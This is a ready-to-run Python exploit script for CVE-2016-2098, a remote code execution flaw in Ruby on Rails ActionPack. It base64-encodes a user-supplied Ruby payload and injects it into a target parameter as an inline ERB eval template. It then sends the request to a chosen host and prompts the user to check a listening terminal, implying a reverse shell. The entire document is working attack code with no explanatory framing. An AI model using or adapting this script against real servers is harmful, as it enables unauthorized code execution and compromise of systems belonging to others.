# Exploit Title: Ruby on Rails ActionPack Inline ERB - Remote Code Execution
# Date: 18/04/2024
# Exploit Author: JHacKL
# Version: 2.3.8
# Tested on: Ubuntu 16.04.6 LTS
# CVE : CVE-2016-2098

#!/bin/python3

import argparse
import json
import base64
import requests

class bcolors:
  HEADER = '\033[95m'
  OKBLUE = '\033[94m'
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  FAIL = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'

class RubyOnRailsExploit:
    def __init__(self, target_host, target_uri, target_param, rport):
        self.target_host = target_host
        self.target_uri = target_uri
        self.target_param = target_param
        self.rport = rport

    def json_request(self, payload):
        code = base64.b64encode(payload.encode()).decode()
        return json.dumps({
            self.target_param: {"inline": "<%= eval(%[{}].unpack(%[m0])[0]) %>".format(code)}
        })

    def exploit(self, payload):
        print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Sending inline code to parameter:", self.target_param)
        headers = {'Accept': 'application/json', 'Content-Type': 'application/json'}
        data = self.json_request(payload)
        url = f"http://{self.target_host}:{self.rport}{self.target_uri}"
        response = requests.get(url, headers=headers, data=data.encode('utf-8'))
        if(response.status_code == 200):
            print(bcolors.OKGREEN + '[+] ' + bcolors.ENDC + 'Exploit Finished!\n'+ bcolors.OKBLUE + '[!] '+ bcolors.ENDC + 'Check your terminal listening...')
        else:
            print(bcolors.FAIL + '[!] ' + bcolors.ENDC + 'Failed to exploit target!')

def main():
    parser = argparse.ArgumentParser(description='Ruby on Rails Exploit')
    parser.add_argument('--target-host', required=True, help='The remote host to attack')
    parser.add_argument('--port', type=int, required=True, help='The port of the vulnerable server')
    parser.add_argument('--target-uri', default='/', help='The path to a vulnerable Ruby on Rails application')
    parser.add_argument('--target-param', default='id', help='The target parameter to inject with inline code')
    parser.add_argument('--payload', required=True, help='The payload to execute on the target server (Ruby payload)')
    args = parser.parse_args()

    with open(args.payload, 'r') as file:
        payload_content = file.read()

    exploit = RubyOnRailsExploit(target_host=args.target_host, target_uri=args.target_uri, target_param=args.target_param, rport=args.port)
    exploit.exploit(payload=payload_content)

if __name__ == "__main__":
    main()
